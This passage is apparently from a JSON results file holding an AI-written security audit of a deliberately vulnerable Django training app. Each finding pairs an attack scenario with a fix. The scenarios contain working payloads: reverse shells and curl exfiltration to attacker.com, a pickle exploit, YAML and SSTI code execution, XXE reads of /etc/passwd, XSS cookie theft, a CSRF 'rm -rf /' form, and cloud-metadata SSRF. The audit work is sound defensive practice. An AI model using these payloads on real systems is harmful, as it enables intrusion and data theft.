Can establish reverse shell: `__import__('socket').socket()...`\n5. Full server compromise with web application privileges\n\n**Blast Radius:**\n- Unrestricted Python code execution\n- Access to all Python modules including os, subprocess, socket\n- Can modify application code, steal secrets from environment variables\n- Accessible via `urls.py:36` at path `cmd_lab2`\n\n**Fix:**\n```python\n# Remove this functionality entirely or implement a sandboxed math evaluator\n# If math evaluation is required:\nimport ast\nimport operator\n\ndef safe_eval(expr):\n    allowed_operators = {\n        ast.Add: operator.add,\n        ast.Sub: operator.sub,\n        ast.Mult: operator.mul,\n        ast.Div: operator.truediv,\n    }\n    def eval_node(node):\n        if isinstance(node, ast.Num):\n            return node.n\n        elif isinstance(node, ast.BinOp):\n            return allowed_operators[type(node.op)](eval_node(node.left), eval_node(node.right))\n        else:\n            raise ValueError(\"Unsupported operation\")\n    return eval_node(ast.parse(expr, mode='eval').body)\n\n# Replace:\noutput = eval(val)\n# With:\noutput = safe_eval(val)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary Code Execution via eval() in mitre_lab_25_api\n\n**Category:** Injection\n\n**Location:** `mitre.py:215`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/mitre/25/lab/api` with `expression=__import__('os').system('id')`\n2. Server executes arbitrary Python code via `eval(expression)`\n3. Attacker escalates to: `__import__('subprocess').check_output('cat /etc/shadow', shell=True)`\n4. Can exfiltrate secrets, establish backdoors, or pivot to internal systems\n\n**Blast Radius:**\n- Full Python interpreter access with web server privileges\n- No authentication required (decorator commented out)\n- Direct access to file system, network, and all imported modules\n- Accessible via `urls.py:118` at path `/mitre/25/lab/api`\n\n**Fix:**\n```python\n# Before:\nresult = eval(expression)\n\n# After:\n# Remove eval() entirely or implement safe mathematical expression parser\n# Use ast.literal_eval for literal Python structures only:\ntry:\n    result = ast.literal_eval(expression)\nexcept (ValueError, SyntaxError):\n    return JsonResponse({'error': 'Invalid expression'}, status=400)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Command Injection in mitre_lab_17_api\n\n**Category:** Injection\n\n**Location:** `mitre.py:239`\n\n**Attack Scenario:**\n1. Attacker submits `ip=127.0.0.1; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh`\n2. The command becomes: `nmap 127.0.0.1; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh`\n3. Shell executes nmap, then downloads and executes attacker's shell script\n4. Attacker gains reverse shell with full web application privileges\n\n**Blast Radius:**\n- Remote code execution on the server\n- Can pivot to internal network services via nmap\n- Access to application secrets and database credentials\n- Accessible via `urls.py:121` at path `/mitre/17/lab/api`\n\n**Fix:**\n```python\n# Before:\ncommand = \"nmap \" + ip\nprocess = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n# After:\nimport ipaddress\n# Validate IP address\ntry:\n    ipaddress.ip_address(ip)\nexcept ValueError:\n    return JsonResponse({'error': 'Invalid IP address'}, status=400)\n# Use subprocess without shell\nprocess = subprocess.Popen(['nmap', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary File Write via Unsafe File Paths in log_function_checker\n\n**Category:** Path Traversal\n\n**Location:** `apis.py:67-72`\n\n**Attack Scenario:**\n1. Attacker sends POST with `log_code` containing malicious Python code: `import os; os.system('cat /etc/passwd > /tmp/pwned')`\n2. The code is written directly to `playground/A9/main.py` without validation\n3. When the application imports this module, the malicious code executes\n4. Attacker can overwrite any Python module in the application directory\n5. Can establish persistent backdoor by modifying startup files\n\n**Blast Radius:**\n- Arbitrary file write within application directory\n- Code execution when modified modules are imported\n- Can overwrite `api.py` at line 71 as well, creating multiple attack vectors\n- Accessible via `urls.py:81` at path `/2021/discussion/A9/api`\n\n**Fix:**\n```python\n# Before:\nf = open(log_filename,\"w\")\nf.write(log_code)\nf.close()\n\n# After:\n# Remove this functionality or implement strict sandboxing\n# If dynamic code evaluation is required, use exec() with restricted globals:\nallowed_globals = {'Log': Log, 'datetime': datetime}\ntry:\n    exec(compile(log_code, '<string>', 'exec'), allowed_globals, {})\nexcept Exception as e:\n    return JsonResponse({\"message\":\"Invalid code\", \"error\": str(e)}, status=400)\n# Never write user-supplied code to actual Python files\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary File Write via Path Traversal in A6_disscussion_api_2\n\n**Category:** Path Traversal\n\n**Location:** `apis.py:131-134`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/2021/discussion/A6/api2` with malicious code\n2. Code is written directly to `playground/A6/utility.py` without validation\n3. When `check_vuln` is called (from `apis.py:115`), malicious code executes\n4. Attacker can inject: `import os; os.system('curl http://attacker.com/$(cat /etc/passwd | base64)')`\n5. Code persists across requests, providing a persistent backdoor\n\n**Blast Radius:**\n- Persistent code execution via module overwrite\n- No input validation on code content\n- Affects `check_vuln` function used in A6_disscussion_api\n- Accessible via `urls.py:88` at path `/2021/discussion/A6/api2`\n\n**Fix:**\n```python\n# Remove this endpoint entirely - allowing users to overwrite application code is never safe\n# If code submission is required for educational purposes:\n# 1. Execute in isolated container/sandbox\n# 2. Never write to application directory\n# 3. Use temporary files with strict permissions\n# 4. Validate code against AST whitelist\n```\n\n---\n\n## [SEVERITY: CRITICAL] Arbitrary File Write in ssrf_code_converter\n\n**Category:** Path Traversal\n\n**Location:** `utility.py:33-36`\n\n**Attack Scenario:**\n1. Attacker submits Python code via ssrf_code_checker (apis.py:27)\n2. Code is processed and written to `playground/ssrf/main.py` without validation\n3. When main.ssrf_lab is imported/called, malicious code executes\n4. Attacker can inject code that persists: `import os; os.system('nc -e /bin/sh attacker.com 4444')`\n\n**Blast Radius:**\n- Arbitrary code execution via module overwrite\n- Code persists and executes on subsequent imports\n- Affects ssrf_code_checker at apis.py:27 and ssrf_lab function\n- Accessible via authenticated users through `/api/ssrf` endpoint\n\n**Fix:**\n```python\n# Remove file writing functionality\n# Execute user code in sandboxed environment:\nimport tempfile\nimport importlib.util\n\ndef execute_user_code(code):\n    # Create temporary module\n    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:\n        f.write(code)\n        temp_path = f.name\n    \n    try:\n        spec = importlib.util.spec_from_file_location(\"user_module\", temp_path)\n        user_module = importlib.util.module_from_spec(spec)\n        spec.loader.exec_module(user_module)\n        return user_module.ssrf_lab\n    finally:\n        os.unlink(temp_path)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Server-Side Template Injection in ssti_lab\n\n**Category:** Injection\n\n**Location:** `views.py:980`\n\n**Attack Scenario:**\n1. Attacker creates blog with payload: `{{config.items()}}`\n2. When blog is rendered via `ssti_view_blog`, Django template engine executes the code\n3. Attacker escalates to RCE: `{% load module %}{{module.__init__.__globals__['__builtins__']['__import__']('os').system('id')}}`\n4. Can read application secrets, database credentials from config\n\n**Blast Radius:**\n- Remote code execution through template rendering\n- Access to Django settings including SECRET_KEY, database credentials\n- Can read arbitrary files via template syntax\n- Persists as saved blog entries\n\n**Fix:**\n```python\n# Before:\nblog = filter_blog(blog)  # filter_blog returns code unchanged\nfile = open(filename, \"w+\") \nfile.write(blog)\n\n# After:\nfrom django.utils.html import escape\n# Escape all user input\nblog = escape(blog)\n# Store as data, not template\nnew_blog.blog_content = blog\nnew_blog.save()\n# Render from database, not file\ndef ssti_view_blog(request, blog_id):\n    blog = Blogs.objects.get(blog_id=blog_id)\n    return render(request, \"base_blog_template.html\", {\"blog_content\": blog.blog_content})\n```\n\n---\n\n## [SEVERITY: CRITICAL] XXE (XML External Entity) Injection in xxe_parse\n\n**Category:** Injection\n\n**Location:** `views.py:259`\n\n**Attack Scenario:**\n1. Attacker sends XML payload:\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<comm><text>&xxe;</text></comm>\n```\n2. Parser with `feature_external_ges=True` processes external entities\n3. Contents of `/etc/passwd` are stored in database comment field\n4. Attacker retrieves via `xxe_see` endpoint\n5. Can escalate to SSRF: `<!ENTITY xxe SYSTEM \"http://internal-service/admin\">`\n\n**Blast Radius:**\n- Read arbitrary files from server file system\n- SSRF to internal network services\n- Potential for denial of service via billion laughs attack\n- Exposed via `urls.py:22` at path `xxe_parse`\n\n**Fix:**\n```python\n# Before:\nparser = make_parser()\nparser.setFeature(feature_external_ges, True)\n\n# After:\nfrom defusedxml.sax import make_parser\nparser = make_parser()\n# defusedxml disables XXE by default\n# Or manually disable:\nparser.setFeature(feature_external_ges, False)\nparser.setFeature(feature_external_pes, False)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Insecure Deserialization via pickle.loads in insec_des_lab\n\n**Category:** Injection\n\n**Location:** `views.py:213`\n\n**Attack Scenario:**\n1. Attacker creates malicious pickle payload:\n```python\nimport pickle, os, base64\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('curl http://attacker.com/$(whoami)',))\npayload = base64.b64encode(pickle.dumps(Exploit()))\n```\n2. Sets cookie `token` to the payload\n3. Server deserializes with `pickle.loads(token)`, executing attacker code\n4. Attacker gains RCE with web server privileges\n\n**Blast Radius:**\n- Unrestricted code execution during deserialization\n- Accessible to all authenticated users via `/insec_des_lab`\n- Can bypass any application-level access controls\n- Affects the entire application security model\n\n**Fix:**\n```python\n# Before:\ntoken = base64.b64decode(token)\nadmin = pickle.loads(token)\n\n# After:\nimport json\n# Use JSON for serialization instead of pickle\n@dataclass\nclass TestUser:\n    admin: int = 0\n    def to_dict(self):\n        return {'admin': self.admin}\n    @staticmethod\n    def from_dict(data):\n        return TestUser(admin=data.get('admin', 0))\n\n# Create token:\nuser_data = json.dumps(TestUser().to_dict())\ntoken = base64.b64encode(user_data.encode())\n\n# Parse token:\ntoken_data = json.loads(base64.b64decode(token))\nadmin = TestUser.from_dict(token_data)\n```\n\n---\n\n## [SEVERITY: CRITICAL] Unsafe YAML Deserialization in a9_lab\n\n**Category:** Injection\n\n**Location:** `views.py:547`\n\n**Attack Scenario:**\n1. Attacker uploads YAML file with malicious payload:\n```yaml\n!!python/object/apply:os.system [\"curl http://attacker.com/$(cat /etc/passwd | base64)\"]\n```\n2. `yaml.load(file, yaml.Loader)` deserializes and executes the payload\n3. Attacker gains RCE and can exfiltrate data\n\n**Blast Radius:**\n- Remote code execution through YAML deserialization\n- File upload makes exploitation trivial\n- Accessible to authenticated users at `/a9_lab`\n- Can compromise entire server\n\n**Fix:**\n```python\n# Before:\ndata = yaml.load(file, yaml.Loader)\n\n# After:\ndata = yaml.safe_load(file)  # Only allows basic Python objects\n# Or for complete safety:\nimport json\ntry:\n    data = yaml.safe_load(file)\nexcept yaml.YAMLError:\n    return render(request, \"Lab/A9/a9_lab.html\", {\"data\": \"Invalid YAML\"})\n```\n\n---\n\n## [SEVERITY: HIGH] Weak Cryptography - MD5 Password Hashing in crypto_failure_lab\n\n**Category:** Secrets Exposure\n\n**Location:** `views.py:1013`\n\n**Attack Scenario:**\n1. Attacker obtains database dump containing MD5 hashes\n2. Uses rainbow tables or hashcat to crack hashes in seconds\n3. For password \"password\", MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99` is instantly reversible\n4. Attacker gains access to all user accounts with weak passwords\n\n**Blast Radius:**\n- All passwords in CF_user table are vulnerable (migrations/0017_cf_user.py shows MD5 hashes)\n- Migration 0018 adds SHA256 passwords but MD5 column remains\n- Compromises user accounts at `/cryptographic_failure/lab`\n\n**Fix:**\n```python\n# Before:\npassword = md5(password.encode()).hexdigest()\n\n# After:\nfrom django.contrib.auth.hashers import make_password, check_password\n# During registration:\nhashed = make_password(password)\nuser.password = hashed\n# During login:\nif check_password(password, user.password):\n    # Valid\n```\n\n---\n\n## [SEVERITY: HIGH] Weak Cryptography - Reversible Hash in customHash function\n\n**Category:** Secrets Exposure\n\n**Location:** `utility.py:58`\n\n**Attack Scenario:**\n1. Function uses SHA256 but reverses the output: `hashlib.sha256(password.encode()).hexdigest()[::-1]`\n2. Attacker with database access reverses the string back\n3. The reversed hash is still vulnerable to rainbow table attacks\n4. Provides no actual security benefit over plain SHA256\n\n**Blast Radius:**\n- Used in crypto_failure_lab2 (views.py:1024)\n- Affects password2 column in CF_user model\n- All users in that lab are vulnerable\n\n**Fix:**\n```python\n# Before:\ndef customHash(password):\n    return hashlib.sha256(password.encode()).hexdigest()[::-1]\n\n# After:\nfrom django.contrib.auth.hashers import make_password\ndef customHash(password):\n    return make_password(password)  # Uses PBKDF2 with salt by default\n```\n\n---\n\n## [SEVERITY: HIGH] JWT Token Verification Without Expiry Check in csrf_transfer_monei\n\n**Category:** Auth Bypass\n\n**Location:** `mitre.py:180`\n\n**Attack Scenario:**\n1. Attacker obtains valid JWT token from auth_cookiee cookie\n2. Token has `exp` claim but server only decodes without verifying expiry\n3. Attacker uses expired token indefinitely to transfer funds\n4. Can replay old tokens even after user has logged out\n\n**Blast Radius:**\n- Allows use of expired authentication tokens\n- Affects CSRF lab money transfer at `/mitre/9/lab/transaction`\n- Token revocation is ineffective\n- Similar issue in auth_failure_lab3 (views.py:1153)\n\n**Fix:**\n```python\n# Before:\npayload = jwt.decode(cookie, 'csrf_vulneribility', algorithms=['HS256'])\n\n# After:\ntry:\n    payload = jwt.decode(\n        cookie, \n        'csrf_vulneribility', \n        algorithms=['HS256'],\n        options={\"verify_exp\": True}  # This is default, but explicit is better\n    )\nexcept jwt.ExpiredSignatureError:\n    return redirect('/mitre/9/lab/login')\nexcept jwt.InvalidTokenError:\n    return redirect('/mitre/9/lab/login')\n```\n\n---\n\n## [SEVERITY: HIGH] Missing Session Invalidation on Logout in auth_failure_lab3\n\n**Category:** Auth Bypass\n\n**Location:** `views.py:1175` (logout functionality missing)\n\n**Attack Scenario:**\n1. User logs in and receives session_id cookie\n2. User \"logs out\" (no logout function implemented)\n3. session_id remains valid in AF_session_id table indefinitely\n4. Attacker with stolen cookie maintains access forever\n5. No mechanism to revoke compromised sessions\n\n**Blast Radius:**\n- Session tokens never expire or get invalidated\n- Stolen sessions cannot be revoked\n- Affects auth_failure_lab3 at `/auth_failure/lab3`\n- AF_session_id table grows unbounded\n\n**Fix:**\n```python\n# Add logout endpoint:\n@csrf_exempt\ndef auth_failure_lab3_logout(request):\n    try:\n        cookie = request.COOKIES[\"session_id\"]\n        AF_session_id.objects.filter(session_id=cookie).delete()\n    except:\n        pass\n    response = redirect('/auth_failure/lab3')\n    response.delete_cookie(\"session_id\")\n    return response\n\n# Add session expiry check in login:\nsession = AF_session_id.objects.get(session_id=cookie)\n# Add created_at field to model and check:\nif session.created_at < datetime.datetime.now() - datetime.timedelta(hours=24):\n    session.delete()\n    return redirect('/auth_failure/lab3')\n```\n\n---\n\n## [SEVERITY: HIGH] Missing CSRF Protection on State-Changing Endpoints\n\n**Category:** CSRF\n\n**Location:** Multiple files (apis.py:23, 61, 93, 113, 126; mitre.py:214; views.py:253, 419, 453)\n\n**Attack Scenario:**\n1. Attacker hosts malicious page with form:\n```html\n<form action=\"http://victim-site.com/cmd_lab\" method=\"POST\">\n  <input name=\"domain\" value=\"example.com; rm -rf /\">\n  <input name=\"os\" value=\"linux\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n2. Logged-in user visits attacker's page\n3. Form auto-submits, executing commands with user's session\n4. Works because `@csrf_exempt` decorator disables CSRF protection\n\n**Blast Radius:**\n- Affects 8+ state-changing endpoints with @csrf_exempt\n- Command injection endpoints become remotely exploitable\n- File write endpoints can be triggered via CSRF\n- Money transfer endpoint vulnerable (csrf_transfer_monei_api)\n\n**Fix:**\n```python\n# Remove @csrf_exempt decorators from state-changing operations:\n# Before:\n@csrf_exempt\ndef cmd_lab(request):\n\n# After:\ndef cmd_lab(request):  # Django's default CSRF protection applies\n    # For API endpoints, use proper token validation:\n    from django.middleware.csrf import get_token\n    # Or implement custom token checking\n```\n\n---\n\n## [SEVERITY: MEDIUM] Reflected XSS in xss_lab\n\n**Category:** XSS\n\n**Location:** `views.py:101`\n\n**Attack Scenario:**\n1. Attacker sends link: `http://site.com/xss?q=<script>fetch('http://attacker.com/'+document.cookie)</script>`\n2. User clicks link while authenticated\n3. Query parameter is rendered without escaping: `{'query': q}`\n4. Script executes in user's browser, stealing session cookies\n5. Attacker gains authenticated session access\n\n**Blast Radius:**\n- Session hijacking through cookie theft\n- Can be chained with CSRF to perform actions as victim\n- Affects `/xssL` endpoint accessible to authenticated users\n\n**Fix:**\n```python\n# Template should auto-escape, but verify:\n# In template file:\n{{ query|escape }}\n# Or in view:\nfrom django.utils.html import escape\nreturn render(request,'Lab/XSS/xss_lab.html', {'query': escape(q)})\n```\n\n---\n\n## [SEVERITY: MEDIUM] Insufficient XSS Filter Bypass in xss_lab2\n\n**Category:** XSS\n\n**Location:** `views.py:112`\n\n**Attack Scenario:**\n1. Filter only removes `<script>` and `</script>` tags\n2. Attacker submits: `<img src=x onerror=alert(document.cookie)>`\n3. Filter doesn't catch event handlers\n4. Or nested: `<scr<script>ipt>alert(1)</scr</script>ipt>`\n5. XSS executes, stealing session data\n\n**Blast Radius:**\n- Bypass of intended XSS protection\n- Session hijacking via cookie theft\n- Affects `/xssL2` endpoint\n\n**Fix:**\n```python\n# Before:\nusername = username.replace(\"<script>\", \"\").replace(\"</script>\", \"\")\n\n# After:\nfrom django.utils.html import escape\nusername = escape(username)\n# Or use bleach for allowlist-based sanitization:\nimport bleach\nusername = bleach.clean(username, tags=[], strip=True)\n```\n\n---\n\n## [SEVERITY: MEDIUM] Path Traversal in ssrf_lab\n\n**Category:** Path Traversal\n\n**Location:** `views.py:936`\n\n**Attack Scenario:**\n1. Attacker submits `blog=../../../etc/passwd` in POST request\n2. `os.path.join(dirname, file)` creates path: `/app/introduction/../../../etc/passwd`\n3. Application reads and displays `/etc/passwd`\n4. Attacker can read application source, config files: `blog=../settings.py`\n5. Steal database credentials or SECRET_KEY\n\n**Blast Radius:**\n- Read arbitrary files accessible to web server user\n- Exposure of application secrets and configuration\n- Can read database connection strings, API keys\n- Accessible via `/ssrf_lab` to authenticated users\n\n**Fix:**\n```python\n# Before:\nfilename = os.path.join(dirname, file)\nfile = open(filename,\"r\")\n\n# After:\nimport os.path\n# Normalize and check path stays within allowed directory\nblog_dir = os.path.join(dirname, 'blogs')\nrequested_file = os.path.normpath(os.path.join(blog_dir, file))\nif not requested_file.startswith(blog_dir):\n    return render(request, \"Lab/ssrf/ssrf_lab.html\", {\"blog\": \"Access denied\"})\n# Additional filename validation:\nif not re.match(r'^[a-zA-Z0-9_-]+\\.txt$', file):\n    return render(request, \"Lab/ssrf/ssrf_lab.html\", {\"blog\": \"Invalid filename\"})\n```\n\n---\n\n## [SEVERITY: MEDIUM] SSRF (Server-Side Request Forgery) in ssrf_lab2\n\n**Category:** SSRF\n\n**Location:** `views.py:962`\n\n**Attack Scenario:**\n1. Attacker submits URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n2. Server makes request to AWS metadata service\n3. Returns temporary AWS credentials to attacker\n4. Or internal service: `http://localhost:8000/admin` to access restricted endpoints\n5. Can scan internal network: `http://192.168.1.1:22`\n\n**Blast Radius:**\n- Access to cloud provider metadata services\n- Port scanning of internal network\n- Bypass IP-based access controls\n- Accessible via `/ssrf_lab2` to authenticated users\n\n**Fix:**\n```python\n# Before:\nresponse = requests.get(url)\n\n# After:\nfrom urllib.parse import urlparse\nimport ipaddress\n\n# Validate URL\nparsed = urlparse(url)\nif parsed.scheme not in ['http', 'https']:\n    return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Invalid protocol\"})\n\n# Block private IPs\ntry:\n    ip = socket.gethostbyname(parsed.hostname)\n    if ipaddress.ip_address(ip).is_private:\n        return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Private IP blocked\"})\nexcept:\n    return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Invalid hostname\"})\n\n# Make request with timeout\nresponse = requests.get(url, timeout=5, allow_redirects=False)\n```\n\n---\n\n## [SEVERITY: MEDIUM] Secrets Exposure in Migration Files\n\n**Category:** Secrets Exposure\n\n**Location:** `migrations/0017_cf_user.py:21-24` and `migrations/0018_cf_user_password2.py:19-22`\n\n**Attack Scenario:**\n1. Attacker gains read access to repository or server filesystem\n2. Migration files contain hardcoded MD5/SHA256 password hashes\n3. Attacker uses rainbow tables or hashcat to crack weak passwords\n4. Gains access to user accounts (alex, admin, rupak)\n\n**Blast Radius:**\n- Hardcoded credentials in version control\n- Hashes are crackable (MD5 for passwords, SHA256 without salt for password2)\n- Anyone with repo access has these credentials\n- Affects production deployments if migrations are run\n\n**Fix:**\n```python\n# Remove hardcoded credentials from migrations\n# Use management command to create initial users:\n# Before (in migration):\nmigrations.RunSQL(\n    \"INSERT INTO introduction_cf_user (username, password) VALUES \"\n    \"('alex', '9d6edee6ce9312981084bd98eb3751ee'),\"\n)\n\n# After: Create separate fixture or management command:\n# python manage.py loaddata initial_users.json\n# With properly hashed passwords using Django's make_password()\n```\n\nThe code contains severe vulnerabilities including multiple SQL injection sinks, remote code execution via eval/pickle/YAML, and command injection that collectively allow complete server compromise. Immediate remediation of CRITICAL findings is essential."
+    }
+  ],
+  "cost_usd_total": 0.6768,
+  "cost_usd_per_run": 0.3384,
+  "finding_counts": [
+    18,
+    20
+  ]
+}
